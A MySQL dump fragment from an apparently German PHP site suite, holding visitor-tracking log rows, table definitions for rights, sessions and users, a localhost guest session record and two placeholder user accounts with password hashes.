INSERT INTO `cs_pot_visitors` VALUES (673782561, 673782561, 1, 2128529172, 2084750625, -1344745653, 0, 1151444282, 2, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-140359930, -140359930, 1, 2128529172, 2084750625, -1344745653, 0, 1151482502, 3, 10, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1889371780, -1889371780, 1, 2128529172, 2084750625, -1344745653, 0, 1151482869, 3, 10, 0);
INSERT INTO `cs_pot_visitors` VALUES (2097822152, 2097822152, 1, 2128529172, 2084750625, -1344745653, 0, 1151483186, 3, 10, 0);
INSERT INTO `cs_pot_visitors` VALUES (1571712676, 1571712676, 1, 2128529172, 2084750625, -1344745653, 0, 1151485845, 3, 11, 0);
INSERT INTO `cs_pot_visitors` VALUES (-349778645, -349778645, 1, 2128529172, 2084750625, -1344745653, 0, 1151486044, 3, 11, 0);
INSERT INTO `cs_pot_visitors` VALUES (-834229626, -834229626, 1, 2128529172, 2084750625, -1344745653, 0, 1151488627, 3, 11, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1473773960, -1473773960, 1, 2128529172, 2084750625, -1344745653, 0, 1151489493, 3, 12, 0);
INSERT INTO `cs_pot_visitors` VALUES (-899333431, -899333431, 1, 2128529172, 2084750625, -1344745653, 0, 1151489557, 3, 12, 0);
INSERT INTO `cs_pot_visitors` VALUES (1946735028, 1946735028, 1, 2128529172, 2084750625, -1344745653, 0, 1151501963, 3, 15, 0);
INSERT INTO `cs_pot_visitors` VALUES (975845391, 975845391, 1, 2128529172, 2084750625, -1344745653, 0, 1151502385, 3, 15, 0);
INSERT INTO `cs_pot_visitors` VALUES (-2107924260, -2107924260, 1, -114077417, -530574017, -1631451101, 0, 1151502571, 3, 15, 0);
INSERT INTO `cs_pot_visitors` VALUES (217243777, 217243777, 1, 2128529172, 2084750625, -1344745653, 0, 1151502729, 3, 15, 0);
INSERT INTO `cs_pot_visitors` VALUES (729610115, 729610115, 1, 2128529172, 2084750625, -1344745653, 0, 1151503422, 3, 16, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1233302556, -1233302556, 1, 2128529172, 2084750625, -1344745653, 0, 1151506329, 3, 16, 0);
INSERT INTO `cs_pot_visitors` VALUES (1637430062, 1637430062, 1, 2128529172, 2084750625, -1344745653, 0, 1151508428, 3, 17, 0);
INSERT INTO `cs_pot_visitors` VALUES (-365732953, -365732953, 1, 2128529172, 2084750625, -1344745653, 0, 1151509703, 3, 17, 0);
INSERT INTO `cs_pot_visitors` VALUES (1771869907, 1771869907, 1, -114077417, -530574017, -1631451101, 0, 1151511529, 3, 18, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1716655378, -1716655378, 1, 2128529172, 2128529172, -1951987443, 0, 1151519588, 3, 20, 0);
INSERT INTO `cs_pot_visitors` VALUES (300845659, 300845659, 1, 2128529172, 2084750625, -1344745653, 0, 1151520941, 3, 20, 0);
INSERT INTO `cs_pot_visitors` VALUES (-375948553, -375948553, 1, -114077417, -530574017, -1631451101, 0, 1151528285, 3, 22, 0);
INSERT INTO `cs_pot_visitors` VALUES (1426468301, 1426468301, 1, 2128529172, 2084750625, -1344745653, 0, 1151568461, 4, 10, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1685171541, -1685171541, 1, 2128529172, 2084750625, -1344745653, 0, 1151570164, 4, 10, 0);
INSERT INTO `cs_pot_visitors` VALUES (43327988, 43327988, 1, 2128529172, 2084750625, -1344745653, 0, 1151570299, 4, 10, 0);
INSERT INTO `cs_pot_visitors` VALUES (1663691643, 1663691643, 1, 2128529172, 2128529172, -1951987443, 0, 1151570639, 4, 10, 0);
INSERT INTO `cs_pot_visitors` VALUES (-537053406, -537053406, 1, 2128529172, 2084750625, -1344745653, 0, 1151570879, 4, 10, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1035575157, -1035575157, 1, 2128529172, 2084750625, -1344745653, 0, 1151577018, 4, 12, 0);
INSERT INTO `cs_pot_visitors` VALUES (-318392098, -318392098, 1, -114077417, -530574017, -1631451101, 0, 1151584471, 4, 14, 0);
INSERT INTO `cs_pot_visitors` VALUES (1779941571, 1779941571, 1, 2128529172, 2084750625, -1344745653, 0, 1151587283, 4, 15, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1264059407, -1264059407, 1, 2128529172, 2128529172, -1523039668, 0, 1151591663, 4, 16, 0);
INSERT INTO `cs_pot_visitors` VALUES (1575472300, 1575472300, 1, 2128529172, 2084750625, -1344745653, 0, 1151593531, 4, 17, 0);
INSERT INTO `cs_pot_visitors` VALUES (2091516548, 2091516548, 1, -114077417, -530574017, -1631451101, -135620945, 1151594905, 4, 17, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1630719883, -1630719883, 1, 2128529172, 2084750625, -1344745653, 0, 1151601976, 4, 19, 0);
INSERT INTO `cs_pot_visitors` VALUES (878128136, 878128136, 1, 2128529172, 2128529172, -1073495851, 0, 1151615369, 4, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1264428277, -1264428277, 1, -114077417, -530574017, -1631451101, 0, 1151615502, 4, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1874312178, -1874312178, 1, -114077417, -530574017, -1631451101, 0, 1151617271, 4, 23, 0);
INSERT INTO `cs_pot_visitors` VALUES (-87117950, -87117950, 1, -114077417, -530574017, -1631451101, 0, 1151626921, 5, 2, 0);
INSERT INTO `cs_pot_visitors` VALUES (210878338, 210878338, 1, -114077417, -530574017, -1631451101, 0, 1151626922, 5, 2, 0);
INSERT INTO `cs_pot_visitors` VALUES (1581634720, 1581634720, 1, 2128529172, 2084750625, -1344745653, 0, 1151663725, 5, 12, 0);
INSERT INTO `cs_pot_visitors` VALUES (-861827762, -861827762, 1, 2128529172, 2084750625, -404511347, 0, 1151665640, 5, 13, 0);
INSERT INTO `cs_pot_visitors` VALUES (1082534756, 1082534756, 1, 2128529172, 2084750625, -1523039668, 0, 1151668734, 5, 13, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1592941603, -1592941603, 1, 2128529172, 2084750625, -1344745653, 0, 1151670360, 5, 14, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1454809668, -1454809668, 1, -114077417, -530574017, -1631451101, 0, 1151718115, 6, 3, 0);
INSERT INTO `cs_pot_visitors` VALUES (1576781435, 1576781435, 1, -114077417, -530574017, -1631451101, 731531047, 1151719994, 6, 4, 0);
INSERT INTO `cs_pot_visitors` VALUES (-407087959, -407087959, 1, -114077417, -530574017, -1631451101, 0, 1151720001, 6, 4, 0);
INSERT INTO `cs_pot_visitors` VALUES (-51024084, -51024084, 1, -114077417, -530574017, -1631451101, 0, 1151720004, 6, 4, 0);
INSERT INTO `cs_pot_visitors` VALUES (251267583, 251267583, 1, -114077417, -530574017, -1631451101, 0, 1151720669, 6, 4, 0);
INSERT INTO `cs_pot_visitors` VALUES (238326715, 238326715, 1, -114077417, -530574017, -1631451101, 1540273964, 1151722601, 6, 4, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1178437099, -1178437099, 1, -114077417, -530574017, -1631451101, -135620945, 1151722608, 6, 4, 0);
INSERT INTO `cs_pot_visitors` VALUES (560071278, 560071278, 1, -114077417, -530574017, -1631451101, -1003281258, 1151722747, 6, 4, 0);
INSERT INTO `cs_pot_visitors` VALUES (1420074004, 1420074004, 1, -114077417, -530574017, -1631451101, 1540273964, 1151724208, 6, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (-461767779, -461767779, 1, -114077417, -530574017, -1631451101, 1540273964, 1151735108, 6, 8, 0);
INSERT INTO `cs_pot_visitors` VALUES (640515773, 640515773, 1, -114077417, -530574017, -1631451101, 1540273964, 1151738907, 6, 9, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1686754765, -1686754765, 1, -114077417, -530574017, -1631451101, 1540273964, 1151741313, 6, 10, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1311488542, -1311488542, 1, -114077417, -530574017, -1631451101, 0, 1151828642, 0, 10, 0);
INSERT INTO `cs_pot_visitors` VALUES (1215329004, 1215329004, 1, -114077417, -530574017, -1631451101, 0, 1151839761, 0, 13, 0);
INSERT INTO `cs_pot_visitors` VALUES (469473366, 469473366, 1, -114077417, -530574017, -1631451101, 0, 1151839806, 0, 13, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1114441026, -1114441026, 1, -114077417, -530574017, -1631451101, 0, 1151841796, 0, 14, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1010550257, -1010550257, 1, -114077417, -530574017, -1631451101, 0, 1151841848, 0, 14, 0);
INSERT INTO `cs_pot_visitors` VALUES (-603296002, -603296002, 1, -114077417, -530574017, -1631451101, 0, 1151841862, 0, 14, 0);
INSERT INTO `cs_pot_visitors` VALUES (1523607391, 1523607391, 1, -114077417, -530574017, -1631451101, 0, 1151841949, 0, 14, 0);
INSERT INTO `cs_pot_visitors` VALUES (361251293, 361251293, 1, -114077417, -530574017, -1631451101, 0, 1151842043, 0, 14, 0);
INSERT INTO `cs_pot_visitors` VALUES (1648853321, 1648853321, 1, -114077417, -530574017, -1631451101, 0, 1151842050, 0, 14, 0);
INSERT INTO `cs_pot_visitors` VALUES (-313844645, -313844645, 1, -114077417, -530574017, -1631451101, 0, 1151842058, 0, 14, 0);
INSERT INTO `cs_pot_visitors` VALUES (167704317, 167704317, 1, -114077417, -530574017, -1631451101, 0, 1151842216, 0, 14, 0);
INSERT INTO `cs_pot_visitors` VALUES (1590944263, 1590944263, 1, -114077417, -530574017, -1631451101, 0, 1151842334, 0, 14, 0);
INSERT INTO `cs_pot_visitors` VALUES (1713175053, 1713175053, 1, -114077417, -530574017, -1631451101, 0, 1151842337, 0, 14, 0);
INSERT INTO `cs_pot_visitors` VALUES (-307542201, -307542201, 1, -114077417, -530574017, -1631451101, 0, 1151843992, 0, 14, 0);
INSERT INTO `cs_pot_visitors` VALUES (-162420259, -162420259, 1, -114077417, -530574017, -1631451101, 0, 1151844019, 0, 14, 0);
INSERT INTO `cs_pot_visitors` VALUES (-411260620, -411260620, 1, -114077417, -530574017, -1631451101, 0, 1151844030, 0, 14, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1996225217, -1996225217, 1, -114077417, -530574017, -1631451101, 0, 1151866100, 0, 20, 0);
INSERT INTO `cs_pot_visitors` VALUES (-789840444, -789840444, 1, -114077417, -530574017, -1631451101, 0, 1151890773, 1, 3, 0);
INSERT INTO `cs_pot_visitors` VALUES (1678657599, 1678657599, 1, -114077417, -530574017, -1631451101, 2049004740, 1151900904, 1, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (557328579, 557328579, 1, -114077417, -530574017, -1631451101, 0, 1151903202, 1, 7, 0);
INSERT INTO `cs_pot_visitors` VALUES (-929292317, -929292317, 1, -114077417, -530574017, -1631451101, 1220846043, 1151909383, 1, 8, 0);
INSERT INTO `cs_pot_visitors` VALUES (908611882, 908611882, 1, -114077417, -530574017, -1631451101, 0, 1151910347, 1, 9, 0);
INSERT INTO `cs_pot_visitors` VALUES (1214405424, 1214405424, 1, -114077417, -530574017, -1631451101, 0, 1151910363, 1, 9, 0);
INSERT INTO `cs_pot_visitors` VALUES (832338898, 832338898, 1, -114077417, -530574017, -1631451101, 0, 1151910668, 1, 9, 0);
INSERT INTO `cs_pot_visitors` VALUES (1292856074, 1292856074, 1, -114077417, -530574017, -1631451101, 0, 1151910957, 1, 9, 0);
INSERT INTO `cs_pot_visitors` VALUES (-815608757, -815608757, 1, -114077417, -530574017, -1631451101, 0, 1151911417, 1, 9, 0);
INSERT INTO `cs_pot_visitors` VALUES (-151682854, -151682854, 1, -114077417, -530574017, -1631451101, 0, 1151911633, 1, 9, 0);
INSERT INTO `cs_pot_visitors` VALUES (589264953, 589264953, 1, -114077417, -530574017, -1631451101, 0, 1151911638, 1, 9, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1458526647, -1458526647, 1, -114077417, -530574017, -1631451101, 0, 1151911876, 1, 9, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1944132979, -1944132979, 1, -114077417, -530574017, -1631451101, 0, 1151911912, 1, 9, 0);
INSERT INTO `cs_pot_visitors` VALUES (350924468, 350924468, 1, -114077417, -530574017, -1631451101, 0, 1151914260, 1, 10, 0);
INSERT INTO `cs_pot_visitors` VALUES (267114441, 267114441, 1, -114077417, -530574017, -1631451101, 0, 1151925247, 1, 13, 0);
INSERT INTO `cs_pot_visitors` VALUES (1457550982, 1457550982, 1, -114077417, -530574017, -1631451101, 0, 1151977257, 2, 3, 0);
INSERT INTO `cs_pot_visitors` VALUES (1061478121, 1061478121, 1, -114077417, -530574017, -1631451101, 0, 1151978715, 2, 4, 0);
INSERT INTO `cs_pot_visitors` VALUES (-2009773540, -2009773540, 1, -114077417, -530574017, -1631451101, 0, 1151988468, 2, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-393478186, -393478186, 1, -114077417, -530574017, -1631451101, 0, 1151999491, 2, 9, 0);
INSERT INTO `cs_pot_visitors` VALUES (1294256786, 1294256786, 1, -114077417, -530574017, -1631451101, 0, 1152027571, 2, 17, 0);
INSERT INTO `cs_pot_visitors` VALUES (676227306, 676227306, 1, -114077417, -530574017, -1631451101, -809290527, 1152028119, 2, 17, 0);
INSERT INTO `cs_pot_visitors` VALUES (-105691199, -105691199, 1, -114077417, -530574017, -1631451101, 0, 1152034048, 2, 19, 0);
INSERT INTO `cs_pot_visitors` VALUES (2136547294, 2136547294, 1, -114077417, -530574017, -1631451101, 0, 1152034225, 2, 19, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1192381509, -1192381509, 1, -114077417, -530574017, -1631451101, 0, 1152106899, 3, 15, 0);
INSERT INTO `cs_pot_visitors` VALUES (75843212, 75843212, 1, -114077417, -530574017, -1631451101, 0, 1152108610, 3, 16, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1229493015, -1229493015, 1, -114077417, -530574017, -1631451101, 0, 1152108681, 3, 16, 0);
INSERT INTO `cs_pot_visitors` VALUES (657922196, 657922196, 1, -114077417, -530574017, -1631451101, 2049004740, 1152116587, 3, 18, 0);
INSERT INTO `cs_pot_visitors` VALUES (-985789689, -985789689, 1, -114077417, -530574017, -1631451101, 0, 1152118208, 3, 18, 0);
INSERT INTO `cs_pot_visitors` VALUES (217014862, 217014862, 1, -114077417, -530574017, -1631451101, 354718797, 1152118440, 3, 18, 0);
INSERT INTO `cs_pot_visitors` VALUES (-48330670, -48330670, 1, -114077417, -530574017, -1631451101, 0, 1152118485, 3, 18, 0);
INSERT INTO `cs_pot_visitors` VALUES (-2097523651, -2097523651, 1, -114077417, -530574017, -1631451101, 0, 1152190298, 4, 14, 0);
INSERT INTO `cs_pot_visitors` VALUES (596741065, 596741065, 1, -114077417, -530574017, -1631451101, 0, 1152190677, 4, 14, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1532284408, -1532284408, 1, 2128529172, 2084750625, -1631451101, 0, 1152191593, 4, 15, 0);
INSERT INTO `cs_pot_visitors` VALUES (-814390928, -814390928, 1, -114077417, -530574017, -1631451101, 0, 1152193328, 4, 15, 0);
INSERT INTO `cs_pot_visitors` VALUES (1897795690, 1897795690, 1, -114077417, -530574017, -1631451101, 0, 1152199687, 4, 17, 0);
INSERT INTO `cs_pot_visitors` VALUES (-235190179, -235190179, 1, -114077417, -530574017, -1631451101, 0, 1152199988, 4, 17, 0);
INSERT INTO `cs_pot_visitors` VALUES (-2003975432, -2003975432, 1, -114077417, -530574017, -1631451101, -905689769, 1152200231, 4, 17, 0);
INSERT INTO `cs_pot_visitors` VALUES (229877981, 229877981, 1, -114077417, -530574017, -1631451101, -1842881660, 1152200363, 4, 17, 0);
INSERT INTO `cs_pot_visitors` VALUES (-213593138, -213593138, 1, -114077417, -530574017, -1631451101, 0, 1152200456, 4, 17, 0);
INSERT INTO `cs_pot_visitors` VALUES (460777716, 460777716, 1, -114077417, -530574017, -1631451101, 0, 1152200516, 4, 17, 0);
INSERT INTO `cs_pot_visitors` VALUES (-2060493182, -2060493182, 1, -114077417, -530574017, -1631451101, 0, 1152204954, 4, 18, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1326664964, -1326664964, 1, -114077417, -530574017, -1631451101, 0, 1152206579, 4, 19, 0);
INSERT INTO `cs_pot_visitors` VALUES (1408449467, 1408449467, 1, -114077417, -530574017, -1631451101, 0, 1152296488, 5, 20, 0);
INSERT INTO `cs_pot_visitors` VALUES (-792473741, -792473741, 1, -114077417, -530574017, -1631451101, 0, 1152296534, 5, 20, 0);
INSERT INTO `cs_pot_visitors` VALUES (-748652049, -748652049, 1, -114077417, -530574017, -1631451101, 0, 1152297911, 5, 20, 0);
INSERT INTO `cs_pot_visitors` VALUES (1190565166, 1190565166, 1, -114077417, -530574017, -1631451101, 0, 1152298490, 5, 20, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1474232034, -1474232034, 1, -114077417, -530574017, -1631451101, -905689769, 1152301235, 5, 21, 0);
INSERT INTO `cs_pot_visitors` VALUES (-2049580776, -2049580776, 1, -114077417, -530574017, -1631451101, 0, 1152402330, 0, 1, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1044059647, -1044059647, 1, -114077417, 565011377, -1631451101, 0, 1152408281, 0, 3, 0);
INSERT INTO `cs_pot_visitors` VALUES (430227544, 430227544, 1, -114077417, 1694105516, -1631451101, 0, 1152408507, 0, 3, 0);
INSERT INTO `cs_pot_visitors` VALUES (-421359163, -421359163, 1, -114077417, 1694105516, -1631451101, 0, 1152409698, 0, 3, 0);
INSERT INTO `cs_pot_visitors` VALUES (-744886365, -744886365, 1, -114077417, 565011377, -1631451101, 0, 1152409966, 0, 3, 0);
INSERT INTO `cs_pot_visitors` VALUES (349151250, 349151250, 1, -114077417, 1694105516, -1631451101, 0, 1152410096, 0, 3, 0);
INSERT INTO `cs_pot_visitors` VALUES (-493507950, -493507950, 1, -114077417, 565011377, -1631451101, 0, 1152410117, 0, 3, 0);
INSERT INTO `cs_pot_visitors` VALUES (1450375094, 1450375094, 1, -114077417, 1694105516, -1631451101, 0, 1152416637, 0, 5, 0);
INSERT INTO `cs_pot_visitors` VALUES (471988640, 471988640, 1, -114077417, 1694105516, -1631451101, 0, 1152418125, 0, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-153563116, -153563116, 1, -114077417, 565011377, -1631451101, 0, 1152419850, 0, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (1121877641, 1121877641, 1, -114077417, 1694105516, -1631451101, 0, 1152474279, 0, 21, 0);
INSERT INTO `cs_pot_visitors` VALUES (-983206847, -983206847, 1, -114077417, 1694105516, -1631451101, 0, 1152486235, 1, 1, 0);
INSERT INTO `cs_pot_visitors` VALUES (742663616, 742663616, 1, -114077417, -530574017, -1631451101, 0, 1152489228, 1, 1, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1647138626, -1647138626, 1, -114077417, 1694105516, -1631451101, 0, 1152490709, 1, 2, 0);
INSERT INTO `cs_pot_visitors` VALUES (446931999, 446931999, 1, -114077417, -530574017, -1631451101, 0, 1152577027, 2, 2, 0);
INSERT INTO `cs_pot_visitors` VALUES (851720377, 851720377, 1, -114077417, -530574017, -1631451101, 0, 1152627399, 2, 16, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1835150834, -1835150834, 1, -114077417, -530574017, -1631451101, 0, 1152647537, 2, 21, 0);
INSERT INTO `cs_pot_visitors` VALUES (1472114571, 1472114571, 1, -114077417, 404955051, 26083, 0, 1152678742, 3, 6, 0);
INSERT INTO `cs_pot_visitors` VALUES (-1512381622, -1512381622, 1, -114077417, -530574017, -1631451101, 0, 1152683303, 3, 7, 0);
INSERT INTO `cs_pot_visitors` VALUES (2059943839, 2059943839, 1, -114077417, -530574017, -1631451101, 0, 1152814461, 4, 20, 0);
INSERT INTO `cs_pot_visitors` VALUES (1518898968, 1518898968, 1, -114077417, -530574017, -1631451101, 0, 1152930733, 6, 4, 0);
INSERT INTO `cs_pot_visitors` VALUES (-43164922, -43164922, 1, -114077417, -530574017, -1631451101, 0, 1152985017, 6, 19, 0);
INSERT INTO `cs_pot_visitors` VALUES (960712795, 960712795, 1, -114077417, -530574017, -1631451101, 0, 1152985059, 6, 19, 0);
INSERT INTO `cs_pot_visitors` VALUES (-885593636, -885593636, 1, -114077417, -530574017, -1631451101, 0, 1152985126, 6, 19, 0);
INSERT INTO `cs_pot_visitors` VALUES (1833438241, 1833438241, 1, -114077417, -530574017, -1631451101, 0, 1152985604, 6, 19, 0);
INSERT INTO `cs_pot_visitors` VALUES (1438943819, 1438943819, 1, -114077417, -530574017, -1631451101, 0, 1153096346, 1, 2, 0);

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `cs_rights`
-- 

CREATE TABLE `cs_rights` (
  `right_id` int(11) NOT NULL auto_increment,
  `name` varchar(255) collate latin1_general_ci NOT NULL,
  `description` text collate latin1_general_ci NOT NULL,
  `timestamp` varchar(255) collate latin1_general_ci NOT NULL,
  PRIMARY KEY  (`right_id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci AUTO_INCREMENT=1 ;

-- 
-- Daten für Tabelle `cs_rights`
-- 


-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `cs_session`
-- 

CREATE TABLE `cs_session` (
  `user_id` int(11) NOT NULL default '0',
  `session_id` varchar(32) NOT NULL,
  `session_data` text NOT NULL,
  `session_name` text NOT NULL,
  `session_expire` int(11) NOT NULL default '0',
  `session_visibility` tinyint(4) NOT NULL default '0',
  `session_where` text NOT NULL,
  PRIMARY KEY  (`session_id`),
  UNIQUE KEY `session_id` (`session_id`),
  KEY `user_id` (`user_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- 
-- Daten für Tabelle `cs_session`
-- 

INSERT INTO `cs_session` VALUES (0, '9ff69e396b4bd1b41ba5842742ae7610', 'client_ip|s:9:"127.0.0.1";client_browser|s:79:"Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8) Gecko/20051111 Firefox/1.5";client_host|s:9:"localhost";suiteSID|s:32:"9ff69e396b4bd1b41ba5842742ae7610";user|a:9:{s:6:"authed";i:0;s:7:"user_id";i:0;s:4:"nick";s:4:"Gast";s:8:"password";s:0:"";s:5:"email";s:0:"";s:10:"first_name";s:7:"Vorname";s:9:"last_name";s:8:"Nachname";s:8:"disabled";s:0:"";s:9:"activated";s:0:"";}_phpOpenTracker_Container|a:22:{s:13:"first_request";b:1;s:9:"client_id";i:1;s:12:"accesslog_id";i:1438943819;s:10:"ip_address";s:9:"127.0.0.1";s:9:"host_orig";s:9:"localhost";s:4:"host";s:9:"localhost";s:15:"user_agent_orig";s:79:"Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8) Gecko/20051111 Firefox/1.5";s:16:"operating_system";s:10:"Windows XP";s:10:"user_agent";s:11:"Firefox/1.5";s:7:"host_id";i:-1631451101;s:19:"operating_system_id";i:-114077417;s:13:"user_agent_id";i:-530574017;s:12:"referer_orig";s:0:"";s:7:"referer";s:0:"";s:10:"referer_id";i:0;s:12:"document_url";s:1:"/";s:8:"document";s:1:"/";s:11:"document_id";i:2043925204;s:11:"plugin_data";a:0:{}s:9:"timestamp";i:1153096346;s:10:"visitor_id";i:1438943819;s:17:"returning_visitor";b:0;}', 'suiteSID', 1153096948, 1, 'index');

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `cs_users`
-- 

CREATE TABLE `cs_users` (
  `user_id` int(10) unsigned NOT NULL auto_increment,
  `email` varchar(150) collate latin1_general_ci NOT NULL default '',
  `nick` varchar(25) collate latin1_general_ci NOT NULL default '',
  `password` varchar(40) collate latin1_general_ci NOT NULL,
  `new_password` varchar(40) collate latin1_general_ci NOT NULL default '',
  `code` varchar(255) collate latin1_general_ci NOT NULL,
  `joined` int(11) NOT NULL default '0',
  `timestamp` int(11) NOT NULL default '0',
  `first_name` varchar(25) collate latin1_general_ci NOT NULL default '',
  `last_name` varchar(25) collate latin1_general_ci NOT NULL default '',
  `infotext` text collate latin1_general_ci NOT NULL,
  `disabled` tinyint(1) NOT NULL default '0',
  `activated` tinyint(1) NOT NULL default '0',
  PRIMARY KEY  (`user_id`),
  KEY `email` (`email`),
  KEY `nick` (`nick`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci AUTO_INCREMENT=22 ;

-- 
-- Daten für Tabelle `cs_users`
-- 

INSERT INTO `cs_users` VALUES (19, 'admin@localhost.de', 'admin', '26a1102e42022f67a17add9ab0e74c9440efa7d2', '26a1102e42022f67a17add9ab0e74c9440efa7d2', '9dd90802013c886ccdd04d524adf3446', 1152190495, 0, '', '', '', 0, 1);
INSERT INTO `cs_users` VALUES (21, 'asdf2@bla.de', 'bla', '27b276d6221741f11b727e0c24979470f2a7b90a', '', '66a147b49d97ad7df250b0dd91f6d930', 1152208688, 0, '', '', '', 0, 1);
